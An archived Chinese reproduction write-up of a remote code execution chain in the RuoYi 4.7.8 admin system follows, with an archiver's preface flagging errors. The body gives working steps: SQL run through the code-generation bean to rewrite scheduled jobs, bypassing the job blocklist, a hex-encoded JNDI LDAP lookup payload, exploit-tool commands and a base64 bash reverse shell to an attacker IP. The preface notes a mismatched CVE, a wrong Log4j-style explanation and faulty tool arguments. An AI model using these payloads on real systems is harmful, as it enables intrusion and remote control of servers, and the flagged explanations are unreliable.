---
cve: "CVE-2022-4566"
source: "gelusus/wxvl 公众号漏洞文库"
product: "RuoYi/任务状态变更校验绕过"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: "CVE-2022-4566"
identifier_role: "reference"
identifier_status: "unknown"
title: "最新Ruoyi漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：实验4.7.8，引用旧<4.7.5；JDK/gadget依赖未锁"
side_effects: "未执行；本文需注意的操作影响：复现会覆盖已有任务且缺恢复；UPDATE job_id=1/3，后启用任意代码目标，需快照与清理而正文没有"
source_status: "unknown"
id: "vw-5950bd3b8073748642435c96"
entity_id: "ve-5950bd3b8073748642435c96"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：实验4.7.8，引用旧&lt;4.7.5；JDK/gadget依赖未锁

代码与实验材料：Bean createTable修改sys_job后changeStatus触发JNDI，源码截图+SQL文本；嵌套引号和工具参数错，修改现有任务1/3有破坏性

来源证据范围：eddiemurphy89原分析链接，未给官方修复

- **事实待核（1）**：CVE与实际新机制错配；依据：4566只在历史背景，当前核心是经Bean SQL修改任务绕过addSave名单，应独立关联。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（2）**：复现会覆盖已有任务且缺恢复；依据：UPDATE job_id=1/3，后启用任意代码目标，需快照与清理而正文没有。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（3）**：混入Log4j式解释及工具错误；依据：${jndi://ldap://...}解释不对应此链InitialContext.lookup；java-jar、jar -C以及大小写参数不一致，Java1.8不足限定gadget。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  最新Ruoyi漏洞复现   
原创 LULU  红队蓝军   2024-10-09 18:00  
  
**漏洞影响：若依4.7.8版本**  
  
**漏洞成因**  
  
在 ruoyi 4.7.5 版本之前，后台接口/tool/gen/createTable处存在 sql 注入(CVE-2022-4566)  
  
![](../../.resource/remote/66b56f2bff35512169435f6499730af65128fcec97f36d59a4df8e4767b98f3a.png "")  
  
找到genTableService的实现类：GenTableServiceImpl，该类同样满足黑白名单条件  
  
![](../../.resource/remote/003302981d0fb834d9e384e8714da79a90fd73685edad905798dd73d2c334c5e.png "")  
  
对应的 Mapper 语句:  
```
<update id="createTable">
       ${sql}
</update>

```  
  
![](../../.resource/remote/6fad68b81e7a6d463a52fce0bc45e0b938fda04a13dd549d03f51cb913cbb807.png "")  
  
如果 GenTableServiceImpl 是 bean 对象，就可以直接调用 GenTableServiceImpl#createTable 执行 SQL 语句  
  
在启动类中打印所有加载的 bean，其中包括 genTableServiceImpl：  
```
ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
// 获取所有bean的名称
String[] beanDefinitionNames = run.getBeanDefinitionNames();
// 打印所有bean的名称
for (String beanDefinitionName : beanDefinitionNames) {
    System.out.println(beanDefinitionName);
}


```  
  
![](../../.resource/remote/02532404c65029e064352779b9d76933fdf3e4205c4eaca14b6a72cf3074e4cc.png "")  
  
ruoyi黑白名单校验仅出现在com.ruoyi.quartz.controller.SysJobController#addSave，而任务状态修改接口中并没有添加，可不调用addSave方法添加计划任务内容，成功绕过黑白名单限制  
  
![](../../.resource/remote/de6a6a8c07d1b040a73c5f117623eba590fe230165de3087a39e607c6c9bc537.png "")  
## 计划任务SQL注入   
  
修改id为1的计划任务的值为’zian’  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian' WHERE job_id = 1;')

```  
  
点击启用任务，ID为1的值成功被修改  
  
![](../../.resource/remote/9a5740ff1abf602602af21635de9ce69f443d1ffd7d2ffc55ce5ae22106cdc8a.png "")  
  
![](../../.resource/remote/760721f88ebbab24d0325e2c1dd6103d078eb95afcd9be6bfa2ebf3b554da498.png "")  
## 利用计划任务执行任意命令   
  
**验证漏洞**  
  
**使用JNDI-Injection-Exploit起一个ldap服务**  
```
${jndi://ldap://xxxx.xxx.cn}

解析payload
1、首先 发现字符串有${},调用lookup函数
2、解析${}中的内容发现是JNDI的ldap服务
3、攻击者构造任意命令

```  
  
1、JNDI利用工具  
```
安装：git clone https://github.com/welk1n/JNDI-Injection-Exploit.git

切换目录：cd JNDI-Injection-Exploit

编译安装：mvn clean package -DskipTests 

切换到target目录 cd target


```  
  
![](../../.resource/remote/f4eb0ed9e5bece027ff0c0a78e5a0d8dc9b377557e6206a719e7947c5d91d89a.png "")  
  
使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，依赖Java 版本1.8 或者1.7  
```
工具使用方式：java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c"命令" -A “攻击机的IP”

```  
```
jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP

```  
  
![](../../.resource/remote/d375f3c8f2026c79f096c13350cbf6e2bcaf55ba33a17e1d63a2a13483b7335b.png "")  
  
由于JobInvokeUtil在调用过程中不允许在字符串中使用括号，因此将原始作业表中特定作业的参数值修改为十六进制（绕过防御检测）  
  
需要将ldap服务进行编码  
```
0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729

```  
  
修改id为3的计划任务为jndi payload  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729 WHERE job_id = 3;')

```  
  
![](../../.resource/remote/47dc27afcb090aacb209a7ed8f5fdf9170f1f5f2794ca6b899f0f05ac4b17557.png "")  
  
启用任务  
  
任务3的调用字符串已经是Jndi payload了，后面直接通过/monitor/job/changeStatus接口直接更改任务状态触发Jndi  
  
![](../../.resource/remote/3097fcd5ebb9262c0557c35cafa063ebf8978ff0016398eeb2d94019451ab893.png "")  
### 漏洞利用  
  
**linux反弹shell**  
  
将反弹shell通过JNDI注入工具部署在LDAP服务 或者RMI 服务中  
```
bash -i >& /dev/tcp/192.168.xx.xx/7788 0>&1
base64编码后
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}

```  
  
生成LDAP服务  
```
运行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}" -A "攻击机ip"

```  
  
![](../../.resource/remote/4a025ee75aaf7594c86325f3f29d58cc3a2e76090b6ec06df155515a8eca5d39.png "")  
  
将ldap服务十六进制编码后，通过计划任务id=2执行，这里使用kali 进行监听  
  
![](../../.resource/remote/5502967bc2232ecc8e8be758830c97350799108b3b3c33d8ec0a29657f1b354d.png "")  
  
参考文章：  
  
https://eddiemurphy89.github.io/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/  
  
加下方wx，拉你一起进群学习  
  
![](../../.resource/remote/27e4a827007a1d4751a947e8ec438b2f7bced0ee85541c16761a6104e1967648.webp "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
